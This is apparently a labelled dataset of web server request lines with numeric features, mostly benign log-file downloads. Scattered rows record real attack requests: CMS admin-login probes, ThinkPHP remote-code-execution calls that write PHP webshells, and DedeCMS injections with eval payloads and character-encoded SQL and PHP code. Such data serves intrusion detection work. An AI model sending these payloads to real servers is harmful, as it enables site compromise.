48,1,200,0,GET /self.logs/access.log.2017-11-30.gz HTTP/1.1
23,1,301,0,GET /self.logs HTTP/1.1
24,1,200,0,GET /self.logs/ HTTP/1.1
48,1,200,0,HEAD /self.logs/error.log.2017-07-06.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2017-07-06.gz HTTP/1.1
48,1,200,0,HEAD /self.logs/error.log.2019-04-26.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2019-04-26.gz HTTP/1.1
66,1,200,0,GET /Datasets%20Description/HTML_Bro_log_3/app_stats.html HTTP/1.1
57,1,200,0,GET /Datasets%20Description/PE_malware/Zeus.html HTTP/1.1
63,1,200,0,GET /Datasets%20Description/HTML_Bro_log_3/notice.html HTTP/1.1
62,1,200,0,GET /Datasets%20Description/HTML_Bro_log_3/files.html HTTP/1.1
56,1,200,0,GET /Datasets%20Description/Network/notice.html HTTP/1.1
55,1,200,0,GET /Datasets%20Description/Network/files.html HTTP/1.1
48,1,404,0,GET /Datasets%20Description/Network/N/A HTTP/1.1
18,1,404,0,GET /data HTTP/1.1
63,1,200,0,GET /Datasets%20Description/PE_malware/VirusShare.html HTTP/1.1
51,1,301,0,GET /Datasets%20Description/HTML_Bro_log_3 HTTP/1.1
52,1,200,0,GET /Datasets%20Description/HTML_Bro_log_3/ HTTP/1.1
37,1,200,0,GET /Datasets%20Description/ HTTP/1.1
52,1,200,0,GET /Datasets%20Description/HTML_Bro_log_2/ HTTP/1.1
56,1,200,0,GET /Datasets%20Description/Network/tunnel.html HTTP/1.1
55,1,200,0,GET /Datasets%20Description/Network/weird.html HTTP/1.1
53,1,200,0,GET /Datasets%20Description/Network/ssl.html HTTP/1.1
54,1,200,0,GET /Datasets%20Description/Network/dhcp.html HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2019-12-25.gz HTTP/1.1
48,1,200,0,HEAD /self.logs/error.log.2019-01-21.gz HTTP/1.1
14,1,200,0,GET / HTTP/1.0
27,1,404,0,GET /css/style.css HTTP/1.0
29,1,200,0,GET /GitHub-Mark.png HTTP/1.0
30,1,200,0,GET /twitter-icon.png HTTP/1.0
39,1,200,0,GET /bootstrap/img/favicon.ico HTTP/1.0
49,1,200,0,HEAD /self.logs/access.log.2018-08-19.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2018-08-19.gz HTTP/1.1
48,1,404,0,GET /self.logs/access.log.2015-05-15.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2017-12-31.gz HTTP/1.1
54,1,200,0,HEAD /self.logs/2015/access.log.2015-06-29.gz HTTP/1.1
53,1,200,0,GET /self.logs/2015/access.log.2015-06-29.gz HTTP/1.1
53,1,200,0,GET /self.logs/2016/access.log.2016-11-25.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2017-01-11.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2017-06-08.gz HTTP/1.1
53,1,200,0,GET /self.logs/2016/access.log.2016-08-24.gz HTTP/1.1
36,1,200,0,GET /maccdc2012/conn.log.gz HTTP/1.1
49,1,200,0,HEAD /self.logs/access.log.2017-11-22.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2017-11-22.gz HTTP/1.1
34,1,404,0,HEAD /admindede/login.php HTTP/1.1
31,1,404,0,HEAD /manage/login.php HTTP/1.1
32,1,404,0,HEAD /htadmin/login.php HTTP/1.1
32,1,404,0,HEAD /manager/login.php HTTP/1.1
29,1,404,0,HEAD /dede/login.php HTTP/1.1
32,1,200,0,GET /self.logs/?C=N;O=A HTTP/1.1
18,1,404,0,GET /data HTTP/1.0
36,1,200,0,GET /maccdc2012/conn.log.gz HTTP/1.0
18,1,404,0,GET /OLD/ HTTP/1.1
53,1,200,0,GET /self.logs/2015/access.log.2015-11-16.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2017-02-25.gz HTTP/1.1
44,1,200,0,GET /self.logs/error.log.2020-04-03 HTTP/1.1
29,1,200,0,GET /self.logs/2015/ HTTP/1.1
54,1,200,0,GET /Datasets%20Description/Network/http.html HTTP/1.1
36,1,200,0,GET /maccdc2012/http.log.gz HTTP/1.1
55,1,200,0,GET /Security-Data-Analysis/Lab_1/conn.log.zip HTTP/1.1
53,1,200,0,GET /self.logs/2015/access.log.2015-03-09.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2017-11-26.gz HTTP/1.1
52,1,200,0,GET /self.logs/2016/error.log.2016-12-01.gz HTTP/1.1
48,1,200,0,HEAD /self.logs/error.log.2019-04-19.gz HTTP/1.0
47,1,200,0,GET /self.logs/error.log.2019-04-19.gz HTTP/1.0
53,1,200,0,HEAD /self.logs/2015/error.log.2015-06-17.gz HTTP/1.1
54,1,200,0,HEAD /self.logs/2015/access.log.2015-05-27.gz HTTP/1.1
53,1,200,0,GET /self.logs/2015/access.log.2015-05-27.gz HTTP/1.1
48,1,301,0,GET /self.logs/access.log.2017-09-05.gz HTTP/1.1
29,1,200,0,GET /self.logs/2016/ HTTP/1.1
32,2,200,0,GET /self.logs/?C=D&O=A HTTP/1.1
47,1,404,0,GET /self.logs/error.log.2015-05-19.gz HTTP/1.1
53,1,200,0,GET /self.logs/2016/access.log.2016-10-23.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2018-10-19.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2018-01-10.gz HTTP/1.1
47,1,404,0,GET /self.logs/error.log.2016-09-26.gz HTTP/1.1
49,1,200,0,HEAD /self.logs/access.log.2019-08-28.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2019-08-28.gz HTTP/1.1
48,1,404,0,GET /self.logs/access.log.2015-01-27.gz HTTP/1.1
52,1,200,0,GET /self.logs/2016/error.log.2016-06-09.gz HTTP/1.1
53,1,200,0,GET /Datasets%20Description/Network/dns.html HTTP/1.1
48,1,404,0,GET /self.logs/access.log.2016-03-01.gz HTTP/1.1
40,1,200,1,GET /honeypot/honeypot.json.zip HTTP/1.1
61,1,404,0,GET /wp-content/plugins/apikey/apikey.php?test=hello HTTP/1.1
48,1,404,0,GET /self.logs/access.log.2016-05-20.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2018-11-25.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2017-04-27.gz HTTP/1.1
47,1,200,1,GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1
49,1,200,0,HEAD /self.logs/access.log.2018-04-13.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2018-04-13.gz HTTP/1.1
48,1,200,0,HEAD /self.logs/error.log.2018-11-13.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2018-11-13.gz HTTP/1.1
48,1,404,0,GET /self.logs/access.log.2015-05-27.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2018-06-07.gz HTTP/1.1
44,1,200,0,GET /self.logs/error.log.2020-03-28 HTTP/1.1
52,1,200,0,GET /self.logs/2015/error.log.2015-10-05.gz HTTP/1.1
25,1,301,0,GET /license.txt HTTP/1.1
15,1,200,0,HEAD / HTTP/1.1
48,1,404,0,GET /self.logs/access.log.2016-10-04.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2018-06-04.gz HTTP/1.1
119,3,404,0,POST /FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F HTTP/1.1
60,4,404,0,GET /index.php?m=member&c=index&a=register&siteid=1 HTTP/1.1
58,1,404,0,POST /admin_aspcms/_system/AspCms_SiteSetting.asp HTTP/1.1
27,1,404,0,GET /plus/moon.php HTTP/1.1
29,1,404,0,POST /plus/90sec.php HTTP/1.1
66,2,404,0,POST /utility/convert/index.php?a=config&source=d7.2_x2.0 HTTP/1.1
50,1,404,0,POST /utility/convert/data/config.inc.php HTTP/1.1
131,3,404,1,GET /uploads/dede/sys_verifies.php?action=getfiles&refiles%5B0%5D=123&refiles%5B1%5D=%5C%22;eval($_POST%5Bysy%5D);die();// HTTP/1.1
56,1,404,0,POST /uploads/dede/sys_verifies.php?action=down HTTP/1.1
46,1,404,0,POST /index.php/api/Uploadify/preview HTTP/1.1
32,1,404,0,GET /user.php?act=login HTTP/1.1
23,1,404,0,POST /fdgq.php HTTP/1.1
160,3,200,1,GET /?s=index/%5Cthink%5Ctemplate%5Cdriver%5Cfile/write&cacheFile=njjdg.php&content=%3C?php%20mb_ereg_replace('.*'_@$_REQUEST%5B_%5D_%20''_%20'e');?%3E HTTP/1.1
24,1,404,0,POST /njjdg.php HTTP/1.1
24,1,404,0,POST /ysyqq.php HTTP/1.1
228,5,200,1,GET /?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=file_put_contents&vars%5B1%5D%5B%5D=tqlrc.php&vars%5B1%5D%5B%5D=%3C?php%20mb_ereg_replace('.*'_@$_REQUEST%5B_%5D_%20''_%20'e');?%3E$ HTTP/1.1
24,1,404,0,POST /tqlrc.php HTTP/1.1
2671,171,404,0,GET /plus/mytag_js.php?dopost=saveedit&arrs1%5B%5D=99&arrs1%5B%5D=102&arrs1%5B%5D=103&arrs1%5B%5D=95&arrs1%5B%5D=100&arrs1%5B%5D=98&arrs1%5B%5D=112&arrs1%5B%5D=114&arrs1%5B%5D=101&arrs1%5B%5D=102&arrs1%5B%5D=105&arrs1%5B%5D=120&arrs2%5B%5D=109&arrs2%5B%5D=121&arrs2%5B%5D=116&arrs2%5B%5D=97&arrs2%5B%5D=103&arrs2%5B%5D=96&arrs2%5B%5D=32&arrs2%5B%5D=40&arrs2%5B%5D=97&arrs2%5B%5D=105&arrs2%5B%5D=100&arrs2%5B%5D=44&arrs2%5B%5D=110&arrs2%5B%5D=111&arrs2%5B%5D=114&arrs2%5B%5D=109&arrs2%5B%5D=98&arrs2%5B%5D=111&arrs2%5B%5D=100&arrs2%5B%5D=121&arrs2%5B%5D=41&arrs2%5B%5D=32&arrs2%5B%5D=86&arrs2%5B%5D=65&arrs2%5B%5D=76&arrs2%5B%5D=85&arrs2%5B%5D=69&arrs2%5B%5D=83&arrs2%5B%5D=40&arrs2%5B%5D=57&arrs2%5B%5D=48&arrs2%5B%5D=57&arrs2%5B%5D=48&arrs2%5B%5D=44&arrs2%5B%5D=39&arrs2%5B%5D=60&arrs2%5B%5D=63&arrs2%5B%5D=112&arrs2%5B%5D=104&arrs2%5B%5D=112&arrs2%5B%5D=32&arrs2%5B%5D=101&arrs2%5B%5D=99&arrs2%5B%5D=104&arrs2%5B%5D=111&arrs2%5B%5D=32&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=100&arrs2%5B%5D=101&arrs2%5B%5D=100&arrs2%5B%5D=101&arrs2%5B%5D=99&arrs2%5B%5D=109&arrs2%5B%5D=115&arrs2%5B%5D=32&arrs2%5B%5D=53&arrs2%5B%5D=46&arrs2%5B%5D=55&arrs2%5B%5D=32&arrs2%5B%5D=48&arrs2%5B%5D=100&arrs2%5B%5D=97&arrs2%5B%5D=121&arrs2%5B%5D=60&arrs2%5B%5D=98&arrs2%5B%5D=114&arrs2%5B%5D=62&arrs2%5B%5D=103&arrs2%5B%5D=117&arrs2%5B%5D=105&arrs2%5B%5D=103&arrs2%5B%5D=101&arrs2%5B%5D=44&arrs2%5B%5D=32&arrs2%5B%5D=57&arrs2%5B%5D=48&arrs2%5B%5D=115&arrs2%5B%5D=101&arrs2%5B%5D=99&arrs2%5B%5D=46&arrs2%5B%5D=111&arrs2%5B%5D=114&arrs2%5B%5D=103&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=59&arrs2%5B%5D=64&arrs2%5B%5D=112&arrs2%5B%5D=114&arrs2%5B%5D=101&arrs2%5B%5D=103&arrs2%5B%5D=95&arrs2%5B%5D=114&arrs2%5B%5D=101&arrs2%5B%5D=112&arrs2%5B%5D=108&arrs2%5B%5D=97&arrs2%5B%5D=99&arrs2%5B%5D=101&arrs2%5B%5D=40&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=47&arrs2%5B%5D=91&arrs2%5B%5D=99&arrs2%5B%5D=111&arrs2%5B%5D=112&arrs2%5B%5D=121&arrs2%5B%5D=114&arrs2%5B%5D=105&arrs2%5B%5D=103&arrs2%5B%5D=104&arrs2%5B%5D=116&arrs2%5B%5D=93&arrs2%5B%5D=47&arrs2%5B%5D=101&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=44&arrs2%5B%5D=36&arrs2%5B%5D=95&arrs2%5B%5D=82&arrs2%5B%5D=69&arrs2%5B%5D=81&arrs2%5B%5D=85&arrs2%5B%5D=69&arrs2%5B%5D=83&arrs2%5B%5D=84&arrs2%5B%5D=91&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=103&arrs2%5B%5D=117&arrs2%5B%5D=105&arrs2%5B%5D=103&arrs2%5B%5D=101&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=93&arrs2%5B%5D=44&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=101&arrs2%5B%5D=114&arrs2%5B%5D=114&arrs2%5B%5D=111&arrs2%5B%5D=114&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=41&arrs2%5B%5D=59&arrs2%5B%5D=63&arrs2%5B%5D=62&arrs2%5B%5D=39&arrs2%5B%5D=41&arrs2%5B%5D=59&arrs2%5B%5D=0 HTTP/1.1
1380,88,418,0,GET /plus/download.php?open=1&arrs1%5B%5D=99&arrs1%5B%5D=102&arrs1%5B%5D=103&arrs1%5B%5D=95&arrs1%5B%5D=100&arrs1%5B%5D=98&arrs1%5B%5D=112&arrs1%5B%5D=114&arrs1%5B%5D=101&arrs1%5B%5D=102&arrs1%5B%5D=105&arrs1%5B%5D=120&arrs2%5B%5D=109&arrs2%5B%5D=121&arrs2%5B%5D=97&arrs2%5B%5D=100&arrs2%5B%5D=96&arrs2%5B%5D=32&arrs2%5B%5D=83&arrs2%5B%5D=69&arrs2%5B%5D=84&arrs2%5B%5D=32&arrs2%5B%5D=96&arrs2%5B%5D=110&arrs2%5B%5D=111&arrs2%5B%5D=114&arrs2%5B%5D=109&arrs2%5B%5D=98&arrs2%5B%5D=111&arrs2%5B%5D=100&arrs2%5B%5D=121&arrs2%5B%5D=96&arrs2%5B%5D=32&arrs2%5B%5D=61&arrs2%5B%5D=32&arrs2%5B%5D=39&arrs2%5B%5D=60&arrs2%5B%5D=63&arrs2%5B%5D=112&arrs2%5B%5D=104&arrs2%5B%5D=112&arrs2%5B%5D=32&arrs2%5B%5D=102&arrs2%5B%5D=105&arrs2%5B%5D=108&arrs2%5B%5D=101&arrs2%5B%5D=95&arrs2%5B%5D=112&arrs2%5B%5D=117&arrs2%5B%5D=116&arrs2%5B%5D=95&arrs2%5B%5D=99&arrs2%5B%5D=111&arrs2%5B%5D=110&arrs2%5B%5D=116&arrs2%5B%5D=101&arrs2%5B%5D=110&arrs2%5B%5D=116&arrs2%5B%5D=115&arrs2%5B%5D=40&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=109&arrs2%5B%5D=111&arrs2%5B%5D=111&arrs2%5B%5D=110&arrs2%5B%5D=46&arrs2%5B%5D=112&arrs2%5B%5D=104&arrs2%5B%5D=112&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=44&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=60&arrs2%5B%5D=63&arrs2%5B%5D=112&arrs2%5B%5D=104&arrs2%5B%5D=112&arrs2%5B%5D=32&arrs2%5B%5D=101&arrs2%5B%5D=118&arrs2%5B%5D=97&arrs2%5B%5D=108&arrs2%5B%5D=40&ar HTTP/1.1
32,1,404,0,POST /e/DoInfo/ecms.php HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2019-05-22.gz HTTP/1.1
26,1,404,0,GET /wp-login.php HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2019-04-19.gz HTTP/1.1
53,1,200,0,GET /Datasets%20Description/Network/ssh.html HTTP/1.1
47,1,404,0,GET /self.logs/error.log.2015-06-06.gz HTTP/1.1
53,1,200,0,HEAD /self.logs/2015/error.log.2015-08-24.gz HTTP/1.1
52,1,200,0,GET /self.logs/2015/error.log.2015-08-24.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2018-04-24.gz HTTP/1.1
52,1,200,0,GET /self.logs/2016/error.log.2016-12-17.gz HTTP/1.1
49,1,200,0,HEAD /self.logs/access.log.2017-01-29.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2017-01-29.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2017-12-21.gz HTTP/1.1
49,1,200,0,HEAD /self.logs/access.log.2018-06-18.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2018-06-18.gz HTTP/1.1
47,1,404,0,GET /self.logs/error.log.2016-12-16.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2020-03-21.gz HTTP/1.1
37,1,404,0,GET /data/admin/allowurl.txt HTTP/1.1
48,1,404,0,GET /self.logs/access.log.2016-12-26.gz HTTP/1.1
62,1,200,0,GET /Datasets%20Description/PE_malware/OPCleaver.html HTTP/1.1
48,1,301,0,GET /self.logs/access.log.2017-02-11.gz HTTP/1.1
51,1,301,0,GET /Datasets%20Description/HTML_Bro_log_1 HTTP/1.1
52,1,200,0,GET /Datasets%20Description/HTML_Bro_log_1/ HTTP/1.1
62,1,200,0,GET /Datasets%20Description/HTML_Bro_log_1/files.html HTTP/1.1
66,1,200,0,GET /Datasets%20Description/HTML_Bro_log_1/app_stats.html HTTP/1.1
52,1,200,0,GET /self.logs/2016/error.log.2016-07-30.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2017-08-06.gz HTTP/1.1
47,1,404,0,GET /self.logs/error.log.2015-01-28.gz HTTP/1.1
37,1,200,0,GET /self.logs/2016/?C=N;O=D HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2020-02-12.gz HTTP/1.1
36,1,200,0,GET /maccdc2012/dhcp.log.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2018-05-09.gz HTTP/1.1
53,1,200,0,GET /self.logs/2015/access.log.2015-05-23.gz HTTP/1.1
47,1,404,0,GET /self.logs/error.log.2016-01-17.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2017-03-31.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2019-02-18.gz HTTP/1.1
53,1,200,0,GET /Datasets%20Description/Network/ftp.html HTTP/1.1
26,1,301,0,GET /%C2%A0%C2%A0 HTTP/1.1
32,1,404,0,GET /%C3%82%C2%A0%C3%82 HTTP/1.1
64,1,404,1,GET /honeypot//%22http://amunhoney.sourceforge.net//%22 HTTP/1.1
51,1,404,1,GET /honeypot//%22http://glastopf.org//%22 HTTP/1.1
53,1,404,1,GET /honeypot//%22http://www.maxmind.com/%22 HTTP/1.1
58,1,404,1,GET /honeypot//%22https://twitter.com/sooshie/%22 HTTP/1.1
59,1,404,1,GET /honeypot//%22https://twitter.com/theroxyd/%22 HTTP/1.1
20,1,404,0,GET /%C2%A0 HTTP/1.1
53,1,200,0,GET /self.logs/2015/access.log.2015-09-28.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2017-10-11.gz HTTP/1.1
48,1,404,0,GET /self.logs/access.log.2015-11-27.gz HTTP/1.1
53,1,200,0,GET /self.logs/2015/access.log.2015-04-09.gz HTTP/1.1
52,1,200,0,GET /self.logs/2016/error.log.2016-05-16.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2020-04-27.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2020-04-28.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2020-04-29.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2020-04-30.gz HTTP/1.1
48,1,404,0,GET /self.logs/access.log.2020-05-01.gz HTTP/1.1
48,1,404,0,GET /self.logs/access.log.2020-05-02.gz HTTP/1.1
48,1,404,0,GET /self.logs/access.log.2020-05-03.gz HTTP/1.1
47,1,304,0,GET /self.logs/error.log.2019-04-23.gz HTTP/1.1
52,1,200,0,GET /self.logs/2016/error.log.2016-04-26.gz HTTP/1.1
44,1,200,0,GET /self.logs/error.log.2020-02-09 HTTP/1.1
61,1,404,0,GET /static/js/kindeditor/themes/default/default.css HTTP/1.1
48,1,200,0,HEAD /self.logs/error.log.2020-04-12.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2020-04-12.gz HTTP/1.1
44,1,200,0,GET /self.logs/error.log.2020-04-20 HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2018-10-23.gz HTTP/1.1
44,1,200,0,GET /self.logs/error.log.2020-04-22 HTTP/1.1
54,1,200,0,HEAD /self.logs/2015/access.log.2015-08-22.gz HTTP/1.1
53,1,200,0,GET /self.logs/2015/access.log.2015-08-22.gz HTTP/1.1
47,1,404,0,GET /self.logs/error.log.2016-06-20.gz HTTP/1.1
53,1,200,0,GET /self.logs/2016/access.log.2016-06-03.gz HTTP/1.1
37,1,200,0,GET /maccdc2012/files.log.gz HTTP/1.1
53,1,200,0,GET /self.logs/2015/access.log.2015-02-28.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2018-11-29.gz HTTP/1.1
23,1,404,0,GET /.git/HEAD HTTP/1.1
48,1,404,0,GET /self.logs/access.log.2015-06-16.gz HTTP/1.1
47,1,404,0,GET /self.logs/error.log.2016-11-25.gz HTTP/1.1
23,1,404,1,GET /xxsssseee HTTP/1.1
24,1,404,0,HEAD //tags.php HTTP/1.1
45,1,200,0,HEAD /self.logs/error.log.2020-02-20 HTTP/1.1
44,1,200,0,GET /self.logs/error.log.2020-02-20 HTTP/1.1
33,1,200,0,GET /tg/tg_snort_full.7z HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2018-06-06.gz HTTP/1.1
52,1,200,0,GET /self.logs/2015/error.log.2015-10-27.gz HTTP/1.1
34,1,200,0,GET /auth.log/auth.log.gz HTTP/1.1
47,1,404,0,GET /self.logs/error.log.2016-08-27.gz HTTP/1.1
21,1,301,0,GET /ads.txt HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2017-01-01.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2019-08-02.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2020-02-01.gz HTTP/1.1
53,1,200,0,GET /self.logs/2015/access.log.2015-03-06.gz HTTP/1.1
47,1,404,0,GET /self.logs/error.log.2015-02-12.gz HTTP/1.1
79,3,200,0,GET /?luicode=10000011&lfid=1076032903573980&u=http://www.secrepo.com/ HTTP/1.0
45,1,200,0,GET /Datasets%20Description/Network/ HTTP/1.1
48,1,200,0,HEAD /self.logs/error.log.2018-06-01.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2018-06-01.gz HTTP/1.1
43,1,200,0,GET /misc/zeus_dga_domains.txt.zip HTTP/1.1
